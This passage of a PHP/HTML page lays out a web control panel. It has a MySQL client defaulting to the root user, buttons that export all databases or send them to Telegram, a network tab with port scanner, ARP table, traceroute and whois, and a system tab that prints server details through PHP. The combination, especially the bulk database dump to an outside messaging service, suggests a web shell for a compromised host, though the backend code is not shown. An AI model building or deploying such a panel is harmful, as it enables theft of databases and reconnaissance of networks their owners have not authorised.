                                        <button id="sqlLogoutBtn" class="text-xs bg-blue-800 hover:bg-blue-900 text-white px-2 py-1 rounded transition-colors">
                                            <i class="fas fa-sign-out-alt mr-1"></i> Disconnect
                                        </button>
                                    </div>
                                    <div class="p-4">
                                        <form id="sqlConnectionForm" class="space-y-3">
                                <div class="flex flex-col">
                                                <label for="sqlHost" class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Host</label>
                                    <input type="text" id="sqlHost" name="host" value="localhost" 
                                                    class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                </div>
                                <div class="flex flex-col">
                                                <label for="sqlPort" class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Port</label>
                                    <input type="text" id="sqlPort" name="port" value="3306"
                                                    class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                </div>
                                <div class="flex flex-col">
                                                <label for="sqlUser" class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Username</label>
                                    <input type="text" id="sqlUser" name="user" value="root"
                                                    class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                </div>
                                <div class="flex flex-col">
                                                <label for="sqlPassword" class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Password</label>
                                    <input type="password" id="sqlPassword" name="password"
                                                    class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                </div>
                                <div class="flex flex-col">
                                                <label for="sqlDatabase" class="text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Database (optional)</label>
                                    <input type="text" id="sqlDatabase" name="database"
                                                    class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                </div>
                                            <div class="pt-2">
                                                <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium rounded text-sm px-4 py-2.5 text-center focus:outline-none transition duration-150">
                                        <i class="fas fa-plug mr-2"></i> Connect
                                    </button>
                                </div>
                            </form>
                                    </div>
                                </div>
                                
                                <!-- Connection Info (Hidden initially) -->
                                <div id="sqlConnectionInfo" class="hidden bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 animate-fadeIn">
                                    <div class="bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-t-lg px-4 py-3">
                                        <h3 class="text-sm font-semibold flex items-center">
                                            <i class="fas fa-info-circle mr-2"></i> Connection Details
                                        </h3>
                                    </div>
                                    <div class="p-3 text-sm">
                                        <div id="sqlConnectionDetails" class="space-y-1">
                                            <!-- Connection details will be populated here -->
                                        </div>
                                    </div>
                        </div>
                        
                        <!-- Database Selection -->
                                <div id="sqlDatabaseSection" class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 hidden animate-fadeIn">
                                    <div class="bg-gradient-to-r from-green-600 to-green-700 text-white rounded-t-lg px-4 py-3 flex justify-between items-center">
                                        <h3 class="text-lg font-semibold flex items-center">
                                            <i class="fas fa-server mr-2"></i> Database
                            </h3>
                                        <button id="sqlDatabaseDisconnectBtn" class="text-xs bg-green-800 hover:bg-green-900 text-white px-2 py-1 rounded transition-colors">
                                            <i class="fas fa-sign-out-alt mr-1"></i> Disconnect Database
                                        </button>
                                    </div>
                                    <div class="p-4">
                                        <select id="sqlDatabaseSelect" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:text-white">
                                    <option value="">Select Database</option>
                                </select>
                            </div>
                        </div>
                        
                        <!-- Table Selection -->
                                <div id="sqlTableSection" class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 hidden animate-fadeIn">
                                    <div class="bg-gradient-to-r from-indigo-600 to-indigo-700 text-white rounded-t-lg px-4 py-3">
                                        <h3 class="text-lg font-semibold flex items-center">
                                            <i class="fas fa-table mr-2"></i> Tables
                            </h3>
                                    </div>
                                    <div class="p-4">
                                        <div class="relative">
                                            <input type="text" id="sqlTableFilter" placeholder="Filter tables..." class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2 mb-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <div class="max-h-60 overflow-y-auto mt-2 border border-gray-200 dark:border-gray-700 rounded">
                                                <ul id="sqlTableList" class="divide-y divide-gray-200 dark:divide-gray-700">
                                                    <li class="p-2 text-sm text-gray-500 dark:text-gray-400 text-center">No tables found</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                            </div>
                            
                            <!-- Global Search Section -->
                                <div id="sqlGlobalSearchSection" class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 hidden animate-fadeIn">
                                    <div class="bg-gradient-to-r from-purple-600 to-purple-700 text-white rounded-t-lg px-4 py-3">
                                        <h3 class="text-lg font-semibold flex items-center">
                                            <i class="fas fa-search mr-2"></i> Global Search
                                        </h3>
                                    </div>
                                    <div class="p-4">
                                        <div class="space-y-2">
                                            <input type="text" id="sqlGlobalSearch" placeholder="Search all databases..." 
                                                class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-purple-500 focus:border-purple-500 block w-full p-2 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <button id="sqlGlobalSearchBtn" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium rounded text-sm px-4 py-2 text-center focus:outline-none transition duration-150">
                                                <i class="fas fa-search mr-2"></i> Search All Databases
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            
                                <!-- Export Section -->
                                <div id="sqlExportSection" class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 hidden animate-fadeIn">
                                    <div class="bg-gradient-to-r from-green-600 to-green-700 text-white rounded-t-lg px-4 py-3">
                                        <h3 class="text-lg font-semibold flex items-center">
                                            <i class="fas fa-file-export mr-2"></i> Export
                            </h3>
                            </div>
                                    <div class="p-4">
                                        <div class="space-y-4">
                                            <!-- Export Buttons -->
                                            <div class="grid grid-cols-1 gap-3">
                                                <!-- SQL Export -->
                                                <button id="sqlExportSql" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium rounded text-sm px-4 py-2 text-center focus:outline-none transition duration-150 flex items-center justify-center" title="Requires table selection">
                                                    <i class="fas fa-file-code mr-2"></i> Export Table SQL
                                                </button>
                                                
                                                <!-- CSV Export -->
                                                <button id="sqlExportCsv" class="w-full bg-green-600 hover:bg-green-700 text-white font-medium rounded text-sm px-4 py-2 text-center focus:outline-none transition duration-150 flex items-center justify-center" title="Requires table selection">
                                                    <i class="fas fa-file-csv mr-2"></i> Export Table CSV
                                                </button>
                                                
                                                <!-- Database Export Divider -->
                                                <div class="border-t border-gray-200 dark:border-gray-600 my-1"></div>
                                                
                                                <!-- Current Database Export Header -->
                                                <div class="text-xs text-gray-500 dark:text-gray-400 font-medium text-center">Current Database</div>
                                                
                                                <!-- ZIP Export -->
                                                <button id="sqlExportZip" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium rounded text-sm px-4 py-2 text-center focus:outline-none transition duration-150 flex items-center justify-center">
                                                    <i class="fas fa-file-archive mr-2"></i> Export Current DB
                                                </button>
                                                
                                                <!-- All Databases Export Header -->
                                                <div class="text-xs text-gray-500 dark:text-gray-400 font-medium text-center">All Databases</div>
                                                
                                                <!-- Export All Databases as ZIP -->
                                                <button id="sqlExportAllZip" class="w-full bg-red-600 hover:bg-red-700 text-white font-medium rounded text-sm px-4 py-2 text-center focus:outline-none transition duration-150 flex items-center justify-center mb-2">
                                                    <i class="fas fa-database mr-2"></i><i class="fas fa-file-archive mr-2"></i> Export All DBs
                                                </button>

                                                <!-- Telegram Backup All Databases -->
                                                <button id="sqlBackupToTelegram" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium rounded text-sm px-4 py-2 text-center focus:outline-none transition duration-150 flex items-center justify-center">
                                                    <i class="fas fa-paper-plane mr-2"></i> Backup All to Telegram
                                                </button>
                                            </div>
                                            
                                            <!-- Export Options -->
                                            <div class="bg-gray-50 dark:bg-gray-700 p-3 rounded-lg border border-gray-200 dark:border-gray-600">
                                                <h4 class="text-sm font-medium text-gray-800 dark:text-gray-200 mb-2">Export Options</h4>
                                                <div class="space-y-2">
                                                    <label class="flex items-center">
                                                        <input type="checkbox" id="exportIncludeStructure" checked class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                                        <span class="ml-2 text-xs text-gray-700 dark:text-gray-300">Include structure</span>
                                                    </label>
                                                    <label class="flex items-center">
                                                        <input type="checkbox" id="exportIncludeData" checked class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                                        <span class="ml-2 text-xs text-gray-700 dark:text-gray-300">Include data</span>
                                                    </label>
                                                    <label class="flex items-center">
                                                        <input type="checkbox" id="exportAddDropTable" checked class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                                        <span class="ml-2 text-xs text-gray-700 dark:text-gray-300">Add DROP TABLE</span>
                                                    </label>
                                                    <label class="flex items-center">
                                                        <input type="checkbox" id="exportCompressed" checked class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                                                        <span class="ml-2 text-xs text-gray-700 dark:text-gray-300">Use compression</span>
                                                    </label>
                                                    <div class="pt-1">
                                                        <span class="text-xs text-gray-500 italic">These options apply to all export types</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                                            <!-- Main content area -->
                                <div class="w-full lg:w-3/4">
                            
                            <!-- Table Data -->
                                    <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 animate-fadeIn">
                                        <div class="bg-gradient-to-r from-cyan-600 to-cyan-700 text-white rounded-t-lg px-4 py-3">
                                            <h3 class="text-lg font-semibold flex items-center">
                                                <i class="fas fa-th mr-2"></i> Table Data
                                            </h3>
                                        </div>
                                        <div class="p-4">
                            <div id="sqlTableData" class="overflow-x-auto">
                                <!-- Table data will be rendered here -->
                                            </div>
                            </div>
                        </div>
                        
                        <!-- SQL Query Editor -->
                                    <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 animate-fadeIn">
                                        <div class="bg-gradient-to-r from-red-600 to-red-700 text-white rounded-t-lg px-4 py-3">
                                            <h3 class="text-lg font-semibold flex items-center">
                                                <i class="fas fa-code mr-2"></i> SQL Query
                            </h3>
                                        </div>
                                        <div class="p-4">
                            <div class="mb-4">
                                <textarea id="sqlQueryInput" rows="5" 
                                                    class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white font-mono"
                                    placeholder="Enter SQL query here..."></textarea>
                                                <p class="text-xs text-gray-500 mt-1 text-right">Press Ctrl+Enter to execute</p>
                            </div>
                            
                            <div class="flex justify-end">
                                                <button id="sqlExecuteQuery" class="bg-green-600 hover:bg-green-700 text-white font-medium rounded text-sm px-5 py-2.5 text-center focus:outline-none transition duration-150">
                                    <i class="fas fa-play mr-2"></i> Execute Query
                                </button>
                            </div>
                            
                            <div id="sqlQueryResult" class="mt-6">
                                <!-- Query results will be rendered here -->
                                            </div>
                            </div>
                        </div>
                    </div>
                        </div>
                   
                </div>
                
                <!-- Network Tools Tab -->
                <div class="hidden p-4 rounded-lg bg-gray-100 dark:bg-gray-900" id="network" role="tabpanel"
                    aria-labelledby="network-tab">
                    <div class="max-w-6xl mx-auto">
                        <h2 class="text-xl font-bold mb-6 text-gray-900 dark:text-white flex items-center">
                            <i class="fas fa-network-wired mr-2 text-blue-500"></i> Network Tools
                        </h2>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <!-- Port Scanner -->
                            <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-radar mr-2 text-green-500"></i> Port Scanner
                                </h3>
                                <form id="portScannerForm" class="space-y-4">
                                    <div>
                                        <label for="hostInput" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Target Host/IP</label>
                                        <input type="text" id="hostInput" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="e.g. 192.168.1.1 or example.com" required>
                                    </div>
                                    <div>
                                        <label for="portRangeInput" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Port Range</label>
                                        <div class="flex space-x-2">
                                            <input type="number" id="startPortInput" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="Start Port" min="1" max="65535" value="80" required>
                                            <span class="flex items-center text-gray-500 dark:text-gray-400">-</span>
                                            <input type="number" id="endPortInput" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="End Port" min="1" max="65535" value="443" required>
                                        </div>
                                    </div>
                                    <div>
                                        <label for="timeoutInput" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Timeout (seconds)</label>
                                        <input type="number" id="timeoutInput" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" value="1" min="1" max="10" required>
                                    </div>
                                    <div class="flex items-center">
                                        <input type="checkbox" id="commonPortsOnly" class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                        <label for="commonPortsOnly" class="ml-2 text-sm font-medium text-gray-700 dark:text-gray-300">Scan common ports only</label>
                                    </div>
                                    <button type="submit" class="w-full px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-search mr-2"></i> Start Scan
                                    </button>
                                </form>
                                <div id="portScanResults" class="mt-4 hidden">
                                    <h4 class="text-md font-medium text-gray-800 dark:text-gray-200 mb-2">Results</h4>
                                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto">
                                        <div id="scanStatus" class="text-sm text-gray-600 dark:text-gray-400 mb-2"></div>
                                        <table class="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                                            <thead class="text-xs text-gray-700 uppercase bg-gray-100 dark:bg-gray-800 dark:text-gray-400">
                                                <tr>
                                                    <th scope="col" class="px-4 py-2">Port</th>
                                                    <th scope="col" class="px-4 py-2">Status</th>
                                                    <th scope="col" class="px-4 py-2">Service</th>
                                                </tr>
                                            </thead>
                                            <tbody id="portScanResultsBody">
                                                <!-- Results will be added here dynamically -->
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Network Information -->
                            <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-info-circle mr-2 text-blue-500"></i> Network Information
                                </h3>
                                <div class="space-y-4">
                                    <button id="getNetworkInfo" class="w-full px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-network-wired mr-2"></i> Get Network Interfaces
                                    </button>
                                    
                                    <div id="networkInfoResults" class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto hidden">
                                        <!-- Network info will be added here dynamically -->
                                    </div>
                                    
                                    <button id="getArpTable" class="w-full px-4 py-2 bg-green-600 hover:bg-green-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-table mr-2"></i> Get ARP Table
                                    </button>
                                    
                                    <div id="arpTableResults" class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto hidden">
                                        <!-- ARP table will be added here dynamically -->
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Ping Tool -->
                            <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-exchange-alt mr-2 text-purple-500"></i> Ping Tool
                                </h3>
                                <form id="pingForm" class="space-y-4">
                                    <div>
                                        <label for="pingHost" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Host/IP Address</label>
                                        <input type="text" id="pingHost" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="e.g. 8.8.8.8 or google.com" required>
                                    </div>
                                    <div class="flex space-x-2">
                                        <div class="w-1/2">
                                            <label for="pingCount" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Count</label>
                                            <input type="number" id="pingCount" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" value="4" min="1" max="10" required>
                                        </div>
                                        <div class="w-1/2">
                                            <label for="pingTimeout" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Timeout (s)</label>
                                            <input type="number" id="pingTimeout" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" value="1" min="1" max="5" required>
                                        </div>
                                    </div>
                                    <button type="submit" class="w-full px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-paper-plane mr-2"></i> Ping
                                    </button>
                                </form>
                                <div id="pingResults" class="mt-4 hidden">
                                    <h4 class="text-md font-medium text-gray-800 dark:text-gray-200 mb-2">Results</h4>
                                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto font-mono text-sm">
                                        <!-- Ping results will be added here dynamically -->
                                    </div>
                                </div>
                            </div>
                            
                            <!-- DNS Lookup Tool -->
                            <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-search mr-2 text-orange-500"></i> DNS Lookup
                                </h3>
                                <form id="dnsLookupForm" class="space-y-4">
                                    <div>
                                        <label for="dnsHost" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Domain Name</label>
                                        <input type="text" id="dnsHost" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="e.g. google.com" required>
                                    </div>
                                    <div>
                                        <label for="dnsType" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Record Type</label>
                                        <select id="dnsType" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <option value="A">A (IPv4 Address)</option>
                                            <option value="AAAA">AAAA (IPv6 Address)</option>
                                            <option value="MX">MX (Mail Exchange)</option>
                                            <option value="NS">NS (Name Server)</option>
                                            <option value="TXT">TXT (Text)</option>
                                            <option value="CNAME">CNAME (Canonical Name)</option>
                                            <option value="SOA">SOA (Start of Authority)</option>
                                            <option value="ALL">All Records</option>
                                        </select>
                                    </div>
                                    <button type="submit" class="w-full px-4 py-2 bg-orange-600 hover:bg-orange-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-search mr-2"></i> Lookup
                                    </button>
                                </form>
                                <div id="dnsResults" class="mt-4 hidden">
                                    <h4 class="text-md font-medium text-gray-800 dark:text-gray-200 mb-2">Results</h4>
                                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto">
                                        <!-- DNS results will be added here dynamically -->
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Traceroute Tool -->
                            <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-route mr-2 text-indigo-500"></i> Traceroute
                                </h3>
                                <form id="tracerouteForm" class="space-y-4">
                                    <div>
                                        <label for="tracerouteHost" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Host/IP Address</label>
                                        <input type="text" id="tracerouteHost" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="e.g. 8.8.8.8 or google.com" required>
                                    </div>
                                    <div class="flex space-x-2">
                                        <div class="w-1/2">
                                            <label for="tracerouteMaxHops" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Max Hops</label>
                                            <input type="number" id="tracerouteMaxHops" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" value="15" min="1" max="30" required>
                                        </div>
                                        <div class="w-1/2">
                                            <label for="tracerouteTimeout" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Timeout (s)</label>
                                            <input type="number" id="tracerouteTimeout" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" value="2" min="1" max="5" required>
                                        </div>
                                    </div>
                                    <button type="submit" class="w-full px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-route mr-2"></i> Trace Route
                                    </button>
                                </form>
                                <div id="tracerouteResults" class="mt-4 hidden">
                                    <h4 class="text-md font-medium text-gray-800 dark:text-gray-200 mb-2">Results</h4>
                                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto font-mono text-sm">
                                        <!-- Traceroute results will be added here dynamically -->
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Whois Lookup Tool -->
                            <div class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-id-card mr-2 text-pink-500"></i> Whois Lookup
                                </h3>
                                <form id="whoisForm" class="space-y-4">
                                    <div>
                                        <label for="whoisDomain" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Domain or IP</label>
                                        <input type="text" id="whoisDomain" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white" placeholder="e.g. example.com or 8.8.8.8" required>
                                    </div>
                                    <button type="submit" class="w-full px-4 py-2 bg-pink-600 hover:bg-pink-700 text-white font-medium rounded-lg text-sm focus:outline-none transition-colors flex items-center justify-center">
                                        <i class="fas fa-search mr-2"></i> Lookup
                                    </button>
                                </form>
                                <div id="whoisResults" class="mt-4 hidden">
                                    <h4 class="text-md font-medium text-gray-800 dark:text-gray-200 mb-2">Results</h4>
                                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg border border-gray-200 dark:border-gray-600 max-h-64 overflow-y-auto font-mono text-sm whitespace-pre-wrap">
                                        <!-- Whois results will be added here dynamically -->
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- System Information Tab -->
                <div class="hidden p-4 rounded-lg bg-white dark:bg-gray-800" id="config" role="tabpanel"
                    aria-labelledby="config-tab">
                    <div class="max-w-6xl mx-auto">
                        <h2 class="text-xl font-bold mb-6 text-gray-900 dark:text-white flex items-center">
                            <i class="fas fa-server mr-2 text-teal-500"></i> System Information
                        </h2>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <!-- Server Information -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-info-circle mr-2 text-blue-500"></i> Server Details
                                </h3>
                                <div class="space-y-3">
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Operating System</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo php_uname(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Server Software</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Server IP</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'Unknown'; ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Hostname</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo gethostname(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Document Root</span>
                                        <span class="text-base text-gray-900 dark:text-white break-all"><?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'; ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Current Directory</span>
                                        <span class="text-base text-gray-900 dark:text-white break-all"><?php echo getcwd(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Server Time</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo date('Y-m-d H:i:s'); ?></span>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- PHP Information -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-200">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fab fa-php mr-2 text-indigo-500"></i> PHP Configuration
                                </h3>
                                <div class="space-y-3">
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">PHP Version</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo phpversion(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Memory Limit</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo ini_get('memory_limit'); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Max Execution Time</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo ini_get('max_execution_time'); ?> seconds</span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Upload Max Filesize</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo ini_get('upload_max_filesize'); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Post Max Size</span>
